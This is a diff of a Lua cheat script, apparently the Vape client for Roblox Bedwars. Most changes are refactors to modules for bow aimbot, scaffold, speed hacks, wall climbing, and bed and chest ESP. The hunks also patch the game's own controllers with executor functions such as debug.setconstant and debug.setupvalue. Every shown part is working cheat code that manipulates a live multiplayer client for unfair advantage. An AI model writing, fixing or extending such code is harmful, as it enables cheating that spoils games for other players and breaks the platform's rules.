 	BowAimbotFOV = BowAimbot.CreateSlider({
 		Name = "FOV",
-		Function = blankFunction,
+		Function = function() end,
 		Min = 1,
 		Max = 1000,
 		Default = 1000
 	})
 	BowAimbotProjectiles = BowAimbot.CreateToggle({
 		Name = "Other Projectiles",
-		Function = blankFunction,
+		Function = function() end,
 		Default = true
 	})
 end)
@@ -5095,7 +4735,7 @@ runFunction(function()
 	end)
 
 	local function checkblocks(pos)
-		for i,v in next, (scaffoldposchecklist) do
+		for i,v in pairs(scaffoldposchecklist) do
 			if getPlacedBlock(pos + v) then
 				return true
 			end
@@ -5113,7 +4753,7 @@ runFunction(function()
 	local function getclosesttop(newmag, pos)
 		local closest, closestmag = pos, newmag * 3
 		if entityLibrary.isAlive then 
-			for i,v in next, (bedwarsStore.blocks) do 
+			for i,v in pairs(bedwarsStore.blocks) do 
 				local close = closestpos(v, pos)
 				local mag = (close - pos).magnitude
 				if mag <= closestmag then 
@@ -5236,7 +4876,7 @@ runFunction(function()
 	})
 	ScaffoldStopMotion = Scaffold.CreateToggle({
 		Name = "Stop Motion",
-		Function = blankFunction,
+		Function = function() end,
 		HoverText = "Stops your movement when going up"
 	})
 	ScaffoldStopMotion.Object.BackgroundTransparency = 0
@@ -5254,16 +4894,16 @@ runFunction(function()
 	})
 	ScaffoldHandCheck = Scaffold.CreateToggle({
 		Name = "Whitelist Only",
-		Function = blankFunction,
+		Function = function() end,
 		HoverText = "Only builds with blocks in your hand."
 	})
 	ScaffoldAnimation = Scaffold.CreateToggle({
 		Name = "Animation",
-		Function = blankFunction
+		Function = function() end
 	})
 end)
 
-_VapeApi.antivoidvelo = nil
+local antivoidvelo
 runFunction(function()
 	local Speed = {Enabled = false}
 	local SpeedMode = {Value = "CFrame"}
@@ -5294,12 +4934,11 @@ runFunction(function()
 						if bedwarsStore.matchState == 0 then return end
 					end
 					if entityLibrary.isAlive then
-						if not (isnetworkowner(entityLibrary.character.HumanoidRootPart) and entityLibrary.character.Humanoid:GetState() ~= Enum.HumanoidStateType.Climbing and (not _VapeApi.spiderActive) and (not GuiLibrary.ObjectsThatCanBeSaved.InfiniteFlyOptionsButton.Api.Enabled) and (not GuiLibrary.ObjectsThatCanBeSaved.FlyOptionsButton.Api.Enabled)) then return end
+						if not (isnetworkowner(entityLibrary.character.HumanoidRootPart) and entityLibrary.character.Humanoid:GetState() ~= Enum.HumanoidStateType.Climbing and (not spiderActive) and (not GuiLibrary.ObjectsThatCanBeSaved.InfiniteFlyOptionsButton.Api.Enabled) and (not GuiLibrary.ObjectsThatCanBeSaved.FlyOptionsButton.Api.Enabled)) then return end
 						if GuiLibrary.ObjectsThatCanBeSaved.GrappleExploitOptionsButton and GuiLibrary.ObjectsThatCanBeSaved.GrappleExploitOptionsButton.Api.Enabled then return end
 						if LongJump.Enabled then return end
-						if _VapeApi.NoMove then return end -- modification
 						if SpeedAnimation.Enabled then
-							for i, v in next, (entityLibrary.character.Humanoid:GetPlayingAnimationTracks()) do
+							for i, v in pairs(entityLibrary.character.Humanoid:GetPlayingAnimationTracks()) do
 								if v.Name == "WalkAnim" or v.Name == "RunAnim" then
 									v:AdjustSpeed(entityLibrary.character.Humanoid.WalkSpeed / 16)
 								end
@@ -5310,7 +4949,7 @@ runFunction(function()
 						if damagetick > tick() then speedValue = speedValue + 20 end
 
 						local speedVelocity = entityLibrary.character.Humanoid.MoveDirection * (SpeedMode.Value == "Normal" and SpeedValue.Value or 20)
-						entityLibrary.character.HumanoidRootPart.Velocity = _VapeApi.antivoidvelo or Vector3.new(speedVelocity.X, entityLibrary.character.HumanoidRootPart.Velocity.Y, speedVelocity.Z)
+						entityLibrary.character.HumanoidRootPart.Velocity = antivoidvelo or Vector3.new(speedVelocity.X, entityLibrary.character.HumanoidRootPart.Velocity.Y, speedVelocity.Z)
 						if SpeedMode.Value ~= "Normal" then 
 							local speedCFrame = entityLibrary.character.Humanoid.MoveDirection * (speedValue - 20) * delta
 							raycastparameters.FilterDescendantsInstances = {lplr.Character}
@@ -5319,7 +4958,7 @@ runFunction(function()
 							entityLibrary.character.HumanoidRootPart.CFrame = entityLibrary.character.HumanoidRootPart.CFrame + speedCFrame
 						end
 
-						if SpeedJump.Enabled and (not Scaffold.Enabled) and (SpeedJumpAlways.Enabled or _VapeApi.killauraNearPlayer) then
+						if SpeedJump.Enabled and (not Scaffold.Enabled) and (SpeedJumpAlways.Enabled or killauraNearPlayer) then
 							if (entityLibrary.character.Humanoid.FloorMaterial ~= Enum.Material.Air) and entityLibrary.character.Humanoid.MoveDirection ~= Vector3.zero then
 								if SpeedJumpSound.Enabled then 
 									pcall(function() entityLibrary.character.HumanoidRootPart.Jumping:Play() end)
@@ -5339,7 +4978,7 @@ runFunction(function()
 		end, 
 		HoverText = "Increases your movement.",
 		ExtraText = function() 
-			return "Heatseeker"
+			return "CFrame"
 		end
 	})
 	SpeedValue = Speed.CreateSlider({
@@ -5358,7 +4997,7 @@ runFunction(function()
 	})
 	SpeedDamageBoost = Speed.CreateToggle({
 		Name = "Damage Boost",
-		Function = blankFunction,
+		Function = function() end,
 		Default = true
 	})
 	SpeedJump = Speed.CreateToggle({
@@ -5379,23 +5018,23 @@ runFunction(function()
 		Min = 0,
 		Max = 30,
 		Default = 25,
-		Function = blankFunction
+		Function = function() end
 	})
 	SpeedJumpAlways = Speed.CreateToggle({
 		Name = "Always Jump",
-		Function = blankFunction
+		Function = function() end
 	})
 	SpeedJumpSound = Speed.CreateToggle({
 		Name = "Jump Sound",
-		Function = blankFunction
+		Function = function() end
 	})
 	SpeedJumpVanilla = Speed.CreateToggle({
 		Name = "Real Jump",
-		Function = blankFunction
+		Function = function() end
 	})
 	SpeedAnimation = Speed.CreateToggle({
 		Name = "Slowdown Anim",
-		Function = blankFunction
+		Function = function() end
 	})
 end)
 
@@ -5415,26 +5054,26 @@ runFunction(function()
 			if callback then
 				table.insert(Spider.Connections, inputService.InputBegan:Connect(function(input1)
 					if input1.KeyCode == Enum.KeyCode.LeftShift then 
-						_VapeApi.holdingshift = true
+						holdingshift = true
 					end
 				end))
 				table.insert(Spider.Connections, inputService.InputEnded:Connect(function(input1)
 					if input1.KeyCode == Enum.KeyCode.LeftShift then 
-						_VapeApi.holdingshift = false
+						holdingshift = false
 					end
 				end))
 				RunLoops:BindToHeartbeat("Spider", function()
-					if entityLibrary.isAlive and (GuiLibrary.ObjectsThatCanBeSaved.PhaseOptionsButton.Api.Enabled == false or _VapeApi.holdingshift == false) then
+					if entityLibrary.isAlive and (GuiLibrary.ObjectsThatCanBeSaved.PhaseOptionsButton.Api.Enabled == false or holdingshift == false) then
 						if SpiderMode.Value == "Normal" then
 							local vec = entityLibrary.character.Humanoid.MoveDirection * 2
 							local newray = getPlacedBlock(entityLibrary.character.HumanoidRootPart.Position + (vec + Vector3.new(0, 0.1, 0)))
 							local newray2 = getPlacedBlock(entityLibrary.character.HumanoidRootPart.Position + (vec - Vector3.new(0, entityLibrary.character.Humanoid.HipHeight, 0)))
 							if newray and (not newray.CanCollide) then newray = nil end 
 							if newray2 and (not newray2.CanCollide) then newray2 = nil end 
-							if _VapeApi.spiderActive and (not newray) and (not newray2) then
+							if spiderActive and (not newray) and (not newray2) then
 								entityLibrary.character.HumanoidRootPart.Velocity = Vector3.new(entityLibrary.character.HumanoidRootPart.Velocity.X, 0, entityLibrary.character.HumanoidRootPart.Velocity.Z)
 							end
-							_VapeApi.spiderActive = ((newray or newray2) and true or false)
+							spiderActive = ((newray or newray2) and true or false)
 							if (newray or newray2) then
 								entityLibrary.character.HumanoidRootPart.Velocity = Vector3.new(newray2 and newray == nil and entityLibrary.character.HumanoidRootPart.Velocity.X or 0, SpiderSpeed.Value, newray2 and newray == nil and entityLibrary.character.HumanoidRootPart.Velocity.Z or 0)
 							end
@@ -5448,7 +5087,7 @@ runFunction(function()
 							end
 							local newray2, newray2pos = getPlacedBlock(entityLibrary.character.HumanoidRootPart.Position + ((entityLibrary.character.HumanoidRootPart.CFrame.lookVector * 1.5) - Vector3.new(0, entityLibrary.character.Humanoid.HipHeight, 0)))
 							if newray2 and (not newray2.CanCollide) then newray2 = nil end
-							_VapeApi.spiderActive = (newray2 and true or false)
+							spiderActive = (newray2 and true or false)
 							if newray2 then 
 								newray2pos = newray2pos * 3
 								local newpos = roundpos(entityLibrary.character.HumanoidRootPart.Position, Vector3.new(newray2pos.X, math.min(entityLibrary.character.HumanoidRootPart.Position.Y, newray2pos.Y), newray2pos.Z), Vector3.new(1.1, 1.1, 1.1))
@@ -5462,7 +5101,7 @@ runFunction(function()
 			else
 				if SpiderPart then SpiderPart:Destroy() end
 				RunLoops:UnbindFromHeartbeat("Spider")
-				_VapeApi.holdingshift = false
+				holdingshift = false
 			end
 		end,
 		HoverText = "Lets you climb up walls"
@@ -5478,7 +5117,7 @@ runFunction(function()
 		Name = "Speed",
 		Min = 0,
 		Max = 40,
-		Function = blankFunction,
+		Function = function() end,
 		Default = 40
 	})
 end)
@@ -5546,7 +5185,7 @@ runFunction(function()
 		Name = "Range",
 		Min = 0,
 		Max = 18,
-		Function = blankFunction
+		Function = function() end
 	})
 end)
 
@@ -5569,7 +5208,7 @@ runFunction(function()
 					local BedFolder = Instance.new("Folder")
 					BedFolder.Parent = BedESPFolder
 					BedESPTable[bed] = BedFolder
-					for bedespnumber, bedesppart in next, (bed:GetChildren()) do
+					for bedespnumber, bedesppart in pairs(bed:GetChildren()) do
 						local boxhandle = Instance.new("BoxHandleAdornment")
 						boxhandle.Size = bedesppart.Size + Vector3.new(.01, .01, .01)
 						boxhandle.AlwaysOnTop = true
@@ -5587,11 +5226,11 @@ runFunction(function()
 						BedESPTable[bed] = nil
 					end
 				end))
-				for i, bed in next, (collectionService:GetTagged("bed")) do 
+				for i, bed in pairs(collectionService:GetTagged("bed")) do 
 					local BedFolder = Instance.new("Folder")
 					BedFolder.Parent = BedESPFolder
 					BedESPTable[bed] = BedFolder
-					for bedespnumber, bedesppart in next, (bed:GetChildren()) do
+					for bedespnumber, bedesppart in pairs(bed:GetChildren()) do
 						if bedesppart:IsA("BasePart") then
 							local boxhandle = Instance.new("BoxHandleAdornment")
 							boxhandle.Size = bedesppart.Size + Vector3.new(.01, .01, .01)
@@ -5641,13 +5280,13 @@ runFunction(function()
 
 	local function getallbedblocks(pos)
 		local blocks = {}
-		for i,v in next, (cachedNormalSides) do
-			for i2,v2 in next, (getallblocks2(pos, v)) do	
+		for i,v in pairs(cachedNormalSides) do
+			for i2,v2 in pairs(getallblocks2(pos, v)) do	
 				if table.find(blocks, v2) == nil and v2 ~= "bed" then
 					table.insert(blocks, v2)
 				end
 			end
-			for i2,v2 in next, (getallblocks2(pos + Vector3.new(0, 0, 3), v)) do	
+			for i2,v2 in pairs(getallblocks2(pos + Vector3.new(0, 0, 3), v)) do	
 				if table.find(blocks, v2) == nil and v2 ~= "bed" then
 					table.insert(blocks, v2)
 				end
@@ -5658,12 +5297,12 @@ runFunction(function()
 
 	local function refreshAdornee(v)
 		local bedblocks = getallbedblocks(v.Adornee.Position)
-		for i2,v2 in next, (v.Frame:GetChildren()) do
+		for i2,v2 in pairs(v.Frame:GetChildren()) do
 			if v2:IsA("ImageLabel") then
 				v2:Remove()
 			end
 		end
-		for i3,v3 in next, (bedblocks) do
+		for i3,v3 in pairs(bedblocks) do
 			local blockimage = Instance.new("ImageLabel")
 			blockimage.Size = UDim2.new(0, 32, 0, 32)
 			blockimage.BackgroundTransparency = 1
@@ -5712,7 +5351,7 @@ runFunction(function()
 		Function = function(callback)
 			if callback then
 				table.insert(BedPlates.Connections, vapeEvents.PlaceBlockEvent.Event:Connect(function(p5)
-					for i, v in next, (BedPlatesFolder:GetChildren()) do 
+					for i, v in pairs(BedPlatesFolder:GetChildren()) do 
 						if v.Adornee then
 							if ((p5.blockRef.blockPosition * 3) - v.Adornee.Position).magnitude <= 20 then
 								refreshAdornee(v)
@@ -5721,7 +5360,7 @@ runFunction(function()
 					end
 				end))
 				table.insert(BedPlates.Connections, vapeEvents.BreakBlockEvent.Event:Connect(function(p5)
-					for i, v in next, (BedPlatesFolder:GetChildren()) do 
+					for i, v in pairs(BedPlatesFolder:GetChildren()) do 
 						if v.Adornee then
 							if ((p5.blockRef.blockPosition * 3) - v.Adornee.Position).magnitude <= 20 then
 								refreshAdornee(v)
@@ -5738,7 +5377,7 @@ runFunction(function()
 						BedPlatesTable[v] = nil
 					end
 				end))
-				for i, v in next, (collectionService:GetTagged("bed")) do
+				for i, v in pairs(collectionService:GetTagged("bed")) do
 					addBed(v)
 				end
 			else
@@ -5749,23 +5388,23 @@ runFunction(function()
 end)
 
 runFunction(function()
-	local ChestESPList = {ObjectList = {}, RefreshList = blankFunction}
+	local ChestESPList = {ObjectList = {}, RefreshList = function() end}
 	local function nearchestitem(item)
-		for i,v in next, (ChestESPList.ObjectList) do 
+		for i,v in pairs(ChestESPList.ObjectList) do 
 			if item:find(v) then return v end
 		end
 	end
 	local function refreshAdornee(v)
 		local chest = v.Adornee.ChestFolderValue.Value
         local chestitems = chest and chest:GetChildren() or {}
-		for i2,v2 in next, (v.Frame:GetChildren()) do
+		for i2,v2 in pairs(v.Frame:GetChildren()) do
 			if v2:IsA("ImageLabel") then
 				v2:Remove()
 			end
 		end
 		v.Enabled = false
 		local alreadygot = {}
-		for itemNumber, item in next, (chestitems) do
+		for itemNumber, item in pairs(chestitems) do
 			if alreadygot[item.Name] == nil and (table.find(ChestESPList.ObjectList, item.Name) or nearchestitem(item.Name)) then 
 				alreadygot[item.Name] = true
 				v.Enabled = true
@@ -5833,7 +5472,7 @@ runFunction(function()
 			if callback then
 				task.spawn(function()
 					table.insert(ChestESP.Connections, collectionService:GetInstanceAddedSignal("chest"):Connect(chestfunc))
-					for i,v in next, (collectionService:GetTagged("chest")) do chestfunc(v) end
+					for i,v in pairs(collectionService:GetTagged("chest")) do chestfunc(v) end
 				end)
 			else
 				ChestESPFolder:ClearAllChildren()
@@ -5911,7 +5550,7 @@ runFunction(function()
 	})
 	FieldOfViewZoom = FieldOfView.CreateToggle({
 		Name = "Zoom",
-		Function = blankFunction,
+		Function = function() end,
 		HoverText = "optifine zoom lol"
 	})
 end)
@@ -5932,12 +5571,12 @@ runFunction(function()
 	local function fpsboosttextures()
 		task.spawn(function()
 			repeat task.wait() until bedwarsStore.matchState ~= 0
-			for i,v in next, (bedwarsStore.blocks) do
+			for i,v in pairs(bedwarsStore.blocks) do
 				if v:GetAttribute("PlacedByUserId") == 0 then
 					v.Material = FPSBoost.Enabled and removetextures.Enabled and Enum.Material.SmoothPlastic or (v.Name:find("glass") and Enum.Material.SmoothPlastic or Enum.Material.Fabric)
 					originaltextures[v] = originaltextures[v] or v.MaterialVariant
 					v.MaterialVariant = FPSBoost.Enabled and removetextures.Enabled and "" or originaltextures[v]
-					for i2,v2 in next, (v:GetChildren()) do 
+					for i2,v2 in pairs(v:GetChildren()) do 
 						pcall(function() 
 							v2.Material = FPSBoost.Enabled and removetextures.Enabled and Enum.Material.SmoothPlastic or (v.Name:find("glass") and Enum.Material.SmoothPlastic or Enum.Material.Fabric)
 							originaltextures[v2] = originaltextures[v2] or v2.MaterialVariant
@@ -5963,9 +5602,9 @@ runFunction(function()
 					damagetab.blowUpSize = 0
 				end
 				if fpsboostkilleffect.Enabled then 
-					for i,v in next, (bedwars.KillEffectController.killEffects) do 
+					for i,v in pairs(bedwars.KillEffectController.killEffects) do 
 						originaleffects[i] = v
-						bedwars.KillEffectController.killEffects[i] = {new = function(char) return {onKill = blankFunction, isPlayDefaultKillEffect = function() return char == lplr.Character end} end}
+						bedwars.KillEffectController.killEffects[i] = {new = function(char) return {onKill = function() end, isPlayDefaultKillEffect = function() return char == lplr.Character end} end}
 					end
 				end
 				if fpsboostdamageeffect.Enabled then 
@@ -5978,9 +5617,9 @@ runFunction(function()
 				getmetatable(bedwars.StopwatchController).tweenOutGhost = function(p17, p18)
 					p18:Destroy()
 				end
-				bedwars.HighlightController.highlight = blankFunction
+				bedwars.HighlightController.highlight = function() end
 			else
-				for i,v in next, (originaleffects) do 
+				for i,v in pairs(originaleffects) do 
 					bedwars.KillEffectController.killEffects[i] = v
 				end
 				fpsboosttextures()
@@ -6029,7 +5668,7 @@ runFunction(function()
 		Name = "GameFixer",
 		Function = function(callback)
 			if callback then
-				if GameFixerHit.Enabled then
+				if GameFixerHit.Enabled then 
 					debug.setconstant(bedwars.SwordController.swingSwordAtMouse, 23, "raycast")
 					debug.setupvalue(bedwars.SwordController.swingSwordAtMouse, 4, bedwars.QueryUtil)
 				end
@@ -6214,150 +5853,23 @@ runFunction(function()
 					["SPEAR_HIT"] = "rbxassetid://7807270398",
 					["SPEAR_THROW"] = "rbxassetid://7813485044",
 				}
-				for i,v in next, (bedwars.CombatController.killSounds) do 
+				for i,v in pairs(bedwars.CombatController.killSounds) do 
 					bedwars.CombatController.killSounds[i] = oldbedwarssoundtable.KILL
 				end
-				for i,v in next, (bedwars.CombatController.multiKillLoops) do 
+				for i,v in pairs(bedwars.CombatController.multiKillLoops) do 
 					bedwars.CombatController.multiKillLoops[i] = ""
 				end
-				for i,v in next, (bedwars.ItemTable) do 
+				for i,v in pairs(bedwars.ItemTable) do 
 					if oldbedwarsicontab[i] then 
 						v.image = oldbedwarsicontab[i]
 					end
 				end			
-				for i,v in next, (oldbedwarssoundtable) do 
+				for i,v in pairs(oldbedwarssoundtable) do 
 					local item = bedwars.SoundList[i]
 					if item then
 						bedwars.SoundList[i] = v
 					end
 				end	
-				local NewHighlightController = {
-					entityCleanup = {}
-				}
-				local bedwarsMaid = debug.getupvalue(getmetatable(bedwars.HighlightController).highlight, 1)
-
-				local function highlightPartNew(character, color, texture)
-					local highlighted = {}
-					for key, side in pairs(Enum.NormalId:GetEnumItems()) do
-						local name = "entity-highlight-texture:" .. tostring(side.Value)
-						local highlight = character:FindFirstChild(name)
-						if not highlight then
-							highlight = Instance.new("Texture")
-							highlight.Name = name
-							highlight.Face = side
-							highlight.Parent = character
-						end
-						highlight.Texture = texture or "rbxassetid://5090332523"
-						highlight.Color3 = color or Color3.new(1, 0, 0)
-						highlight.Transparency = 0.1
-						table.insert(highlighted, highlight)	
-					end
-					return highlighted
-				end
-				local function highlightNew(character, configTable)
-					if configTable == nil then
-						configTable = {}
-					end
-					local v5 = NewHighlightController.entityCleanup[character]
-					if v5 ~= nil then
-						v5:DoCleaning()
-					end
-					local highlightMaid = bedwarsMaid.new()
-					NewHighlightController.entityCleanup[character] = highlightMaid
-					local u4 = true
-					highlightMaid:GiveTask(function()
-						u4 = false
-					end)
-					local v7 = {}
-					local v8 = {}
-					local v9 = #v8
-					local v10 = character:GetDescendants()
-					local v11 = #v10
-					table.move(v10, 1, v11, v9 + 1, v8)
-					v8[v9 + v11 + 1] = character
-					for v12, v13 in v8, nil do
-						if v13:IsA("BasePart") and v13.Transparency ~= 1 then
-							for v14, v15 in highlightPartNew(v13, configTable.color, configTable.textureId) do
-								table.insert(v7, v15)
-							end
-						end
-					end
-					local v16 = configTable.transparency
-					if v16 == nil then
-						v16 = 0.1
-					end
-					local v17 = configTable.fadeInTime
-					if v17 == nil then
-						v17 = 0
-					end
-					local v18 = v17 > 0
-					if v18 then
-						local v19 = 1
-					else
-						v19 = v16
-					end
-					local u5 = bedwars.make("NumberValue", {
-						Value = v19
-					})
-					local function u6()
-						for v20, v21 in v7, nil do
-							if not v21.Parent then
-								table.remove(v7, (table.find(v7, v21) and 0) - 1 + 1)
-							else
-								v21.Transparency = u5.Value
-							end
-						end
-					end
-					local v22 = u5.Changed:Connect(function()
-						u6()
-					end)
-					u6()
-					highlightMaid:GiveTask(function()
-						v22:Disconnect()
-						u5:Destroy()
-					end)
-					task.spawn(function()
-						if v18 and u4 then
-							local v23 = configTable.fadeInTime
-							if v23 == nil then
-								v23 = 0
-							end
-							local v24 = tweenService:Create(u5, TweenInfo.new(v23, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {
-								Value = v16
-							})
-							v24:Play()
-							highlightMaid:GiveTask(function()
-								v24:Cancel()
-							end)
-							v24.Completed:Wait()
-						end
-						if configTable.lastsForever then
-							return nil
-						end
-						if configTable.duration ~= nil and u4 then
-							task.wait(configTable.duration)
-						end
-						if configTable.fadeOutTime ~= nil and u4 then
-							local v25 = tweenService:Create(u5, TweenInfo.new(configTable.fadeOutTime, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {
-								Value = 1
-							})
-							v25:Play()
-							highlightMaid:GiveTask(function()
-								v25:Cancel()
-							end)
-							v25.Completed:Wait()
-						elseif configTable.fadeOutTime == nil and u4 then
-							u5.Value = 1
-						end
-						highlightMaid:DoCleaning()
-					end)
-					return highlightMaid
-				end
-				table.insert(vapeConnections, vapeEvents.EntityDamageEvent.Event:Connect(function(damageTable)
-					if damageTable.entityInstance ~= lplr.Character then
-						highlightNew(damageTable.entityInstance, { duration = 0.13 })
-					end
-				end))
 				local damagetab = debug.getupvalue(bedwars.DamageIndicator, 2)
 				damagetab.strokeThickness = false
 				damagetab.textSize = 32
@@ -6367,209 +5879,26 @@ runFunction(function()
 				damagetab.blowUpCompleteDuration = 0
 				damagetab.anchoredDuration = 0
 				debug.setconstant(bedwars.ViewmodelController.show, 37, "")
-				debug.setconstant(bedwars.DamageIndicator, 1, "scrxpted")
-				local function spawnDamageIndicatorNew(p5, p6, p7, p8)
-					local v22 = (gameCamera.CFrame.Position - p6).Magnitude > 200
-					if v22 then
-						local v23 = p8
-						if v23 ~= nil then
-							v23 = v23.infiniteRange
-						end
-						v22 = not v23
-					end
-					if v22 then
-						return nil
-					end
-					p7 = math.ceil(p7)
-					local v24 = p8
-					if v24 ~= nil then
-						v24 = v24.heal
-					end
-					local v25 = v24
-					if v25 == nil then
-						v25 = false
-					end
-					local v26 = Instance.new("Part")
-					v26.Name = "DamageIndicatorPart"
-					v26.Size = Vector3.new(1, 1, 1)
-					v26.Transparency = 1
-					v26.CanCollide = false
-					v26.CanQuery = false
-					v26.CFrame = CFrame.new(p6)
-					v26.Anchored = true
-					task.delay(damagetab.anchoredDuration, function()
-						v26.Anchored = false
-					end)
-					local v27 = Instance.new("BodyForce")
-					if p7 < 0 then
-						local v28 = damagetab.gravityHeal
-					else
-						v28 = damagetab.gravityDamage
-					end
-					v27.Force = Vector3.new(0, v26:GetMass() * workspace.Gravity * v28, 0)
-					v27.Parent = v26
-					v26.Velocity = Vector3.new(math.random(-50, 50) / 100 * damagetab.velX, 0, math.random(-50, 50) / 100 * damagetab.velZ)
-					local v29 = Instance.new("BillboardGui")
-					local v30 = 2.1 + 0.7 * (math.min(p7, 100) / 100)
-					v29.Size = UDim2.new(v30 * 2.1, 0, v30, 0)
-					v29.AlwaysOnTop = true
-					local v31 = p8
-					if v31 ~= nil then
-						v31 = v31.infiniteRange
-					end
-					if v31 then
-						local v32 = math.huge
-					else
-						v32 = 100
-					end
-					v29.MaxDistance = v32
-					local v33 = bedwars.make("Frame", {
-						Size = UDim2.fromScale(1, 1), 
-						Position = UDim2.fromScale(0.5, 0.5), 
-						AnchorPoint = Vector2.new(0.5, 0.5), 
-						BackgroundTransparency = 1, 
-						Parent = v29
-					})
-					local v34 = nil
-					local v35 = p8
-					if v35 ~= nil then
-						v35 = v35.image
-					end
-					if v35 ~= "" and v35 then
-						local v36 = {
-							BackgroundTransparency = 1
-						}
-						local v37 = p8
-						if v37 ~= nil then
-							v37 = v37.image
-						end
-						v36.Image = v37
-						v36.ImageColor3 = p8.imageColor
-						v36.Position = UDim2.fromScale(0.25, 0.5)
-						v36.AnchorPoint = Vector2.new(0, 0.5)
-						v36.Size = UDim2.fromScale(0.25, 1)
-						v36.Parent = v33
-						v34 = bedwars.make("ImageLabel", v36)
-						bedwars.make("UIAspectRatioConstraint", {
-							DominantAxis = Enum.DominantAxis.Width, 
-							AspectRatio = 1, 
-							Parent = v34
-						})
-					end
-					local v38 = Instance.new("TextLabel")
-					v38.Text = tostring(p7)
-					v38.Size = UDim2.new(0.5, 0, 1, 0)
-					v38.BackgroundTransparency = 1
-					v38.BorderSizePixel = 0
-					v38.Font = Enum.Font.LuckiestGuy
-					v38.Position = UDim2.fromScale(0.5, 0.5)
-					v38.AnchorPoint = Vector2.new(0, 0.5)
-					v38.TextSize = 25
-					v38.TextXAlignment = Enum.TextXAlignment.Left
-					local v39 = nil
-					local v40 = p8
-					if v40 ~= nil then
-						v40 = v40.color
-					end
-					if v40 then
-						if typeof(p8.color) == "Color3" then
-							v39 = p8.color
-						else
-							v39 = bedwars.ColorUtil.WHITE
-						end
-					end
-					v38.TextColor3 = v39 or damagetab.baseColor
-					local v41 = p8
-					if v41 ~= nil then
-						v41 = v41.color
-					end
-					local v42 = v41 and typeof(p8.color) == "ColorSequence"
-					if v42 then
-						bedwars.make("UIGradient", {
-							Color = p8.color, 
-							Rotation = p8.gradientRotation, 
-							Parent = v38
-						})
-					end
-					local v43 = bedwars.make("UIStroke", {
-						Parent = v38, 
-						Thickness = damagetab.strokeThickness, 
-						Color = Color3.fromRGB(0, 0, 0)
-					})
-					local v44 = Color3.fromRGB(255, 255, 255)
-					if v25 then
-						v38.Text = "+" .. tostring(p7)
-						v38.TextColor3 = bedwars.theme.mcGreen
-					else
-						local v45 = p8
-						if v45 ~= nil then
-							v45 = v45.shieldHit
-						end
-						if v45 then
-							v38.TextColor3 = bedwars.healthBarShieldColor
-						end
-					end
-					local v46 = p8
-					if v46 ~= nil then
-						v46 = v46.damageType
-					end
-					if v46 == 8 then -- poison damage
-						v38.TextColor3 = bedwars.ColorUtil.hexColor(5025629)
-					end
-					v38.Parent = v33
-					v29.Parent = v26
-					v26.Parent = workspace
-					task.spawn(function()
-						local l__TextSize__48 = v38.TextSize
-						local u19 = l__TextSize__48
-						local u20 = v33.Size
-						local u21 = damagetab.blowUpSize / l__TextSize__48
-						local v49 = bedwars.TweenDefault(damagetab.blowUpDuration, bedwars.EasingFunctions.Linear, function(p9)
-							v38.TextSize = u19 * (1 - p9) + p9 * damagetab.blowUpSize
-							local v50 = 1 - p9
-							local v51 = UDim2.new(u20.X.Scale * v50, u20.X.Offset * v50, u20.Y.Scale * v50, u20.Y.Offset * v50)
-							local v52 = p9 * u21
-							v33.Size = v51 + UDim2.new(u20.X.Scale * v52, u20.X.Offset * v52, u20.Y.Scale * v52, u20.Y.Offset * v52)
-						end, 0, 1)
-						v49:Play()
-						v49:Wait()
-						u19 = v38.TextSize
-						u20 = v33.Size
-						local u22 = damagetab.textSize / u19
-						bedwars.TweenDefault(damagetab.blowUpCompleteDuration, bedwars.EasingFunctions.Linear, function(p10)
-							v38.TextSize = u19 * (1 - p10) + p10 * damagetab.textSize
-							local v53 = 1 - p10
-							local v54 = UDim2.new(u20.X.Scale * v53, u20.X.Offset * v53, u20.Y.Scale * v53, u20.Y.Offset * v53)
-							local v55 = p10 * u22
-							v33.Size = v54 + UDim2.new(u20.X.Scale * v55, u20.X.Offset * v55, u20.Y.Scale * v55, u20.Y.Offset * v55)
-						end, 0, 1):Play()
-					end)
-					local u23 = tweenService:Create(v43, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
-						Transparency = 1
-					})
-					task.spawn(function()
-						v26.Velocity = Vector3.new((math.random(-50, 50) / 100) * damagetab.velX, (math.random(50, 60) / 100) * damagetab.velY, (math.random(-50, 50) / 100) * damagetab.velZ)
-						local textcompare = v38.TextColor3
-						if textcompare ~= Color3.fromRGB(85, 255, 85) then
-							local newtween = tweenService:Create(v38, TweenInfo.new(0.5, Enum.EasingStyle.Linear), {
-								TextColor3 = (textcompare == Color3.fromRGB(76, 175, 93) and Color3.new(0, 0, 0) or Color3.new(1, 1, 1))
-							})
-							task.wait(0.15)
-							newtween:Play()
-						end
-					end)
-					bedwars.RuntimeLib.Promise.delay(damagetab.anchoredDuration + 0.5):andThen(function()
-						bedwars.TweenDefault(0.2, bedwars.EasingFunctions.OutQuad, function(p11)
-							v38.TextTransparency = p11
-							if v34 then
-								v34.ImageTransparency = p11
+				debug.setconstant(bedwars.DamageIndicator, 83, Enum.Font.LuckiestGuy)
+				debug.setconstant(bedwars.DamageIndicator, 102, "Enabled")
+				debug.setconstant(bedwars.DamageIndicator, 118, 0.3)
+				debug.setconstant(bedwars.DamageIndicator, 128, 0.5)
+				debug.setupvalue(bedwars.DamageIndicator, 10, {
+					Create = function(self, obj, ...)
+						task.spawn(function()
+							obj.Parent.Parent.Parent.Parent.Velocity = Vector3.new((math.random(-50, 50) / 100) * damagetab.velX, (math.random(50, 60) / 100) * damagetab.velY, (math.random(-50, 50) / 100) * damagetab.velZ)
+							local textcompare = obj.Parent.TextColor3
+							if textcompare ~= Color3.fromRGB(85, 255, 85) then
+								local newtween = tweenService:Create(obj.Parent, TweenInfo.new(0.5, Enum.EasingStyle.Linear), {
+									TextColor3 = (textcompare == Color3.fromRGB(76, 175, 93) and Color3.new(0, 0, 0) or Color3.new(1, 1, 1))
+								})
+								task.wait(0.15)
+								newtween:Play()
 							end
-						end, 0, 1)
-						u23:Play()
-					end)
-					game:GetService("Debris"):AddItem(v26, 1.5)
-				end
-				bedwars.DamageIndicatorController.spawnDamageIndicator = spawnDamageIndicatorNew
+						end)
+						return tweenService:Create(obj, ...)
+					end
+				})
 				sethiddenproperty(lightingService, "Technology", "ShadowMap")
 				lightingService.Ambient = Color3.fromRGB(69, 69, 69)
 				lightingService.Brightness = 3
@@ -6596,7 +5925,7 @@ runFunction(function()
 		end,
 		Winter = function() 
 			task.spawn(function()
-				for i,v in next, (lightingService:GetChildren()) do
+				for i,v in pairs(lightingService:GetChildren()) do
 					if v:IsA("Atmosphere") or v:IsA("Sky") or v:IsA("PostEffect") then
 						v:Remove()
 					end
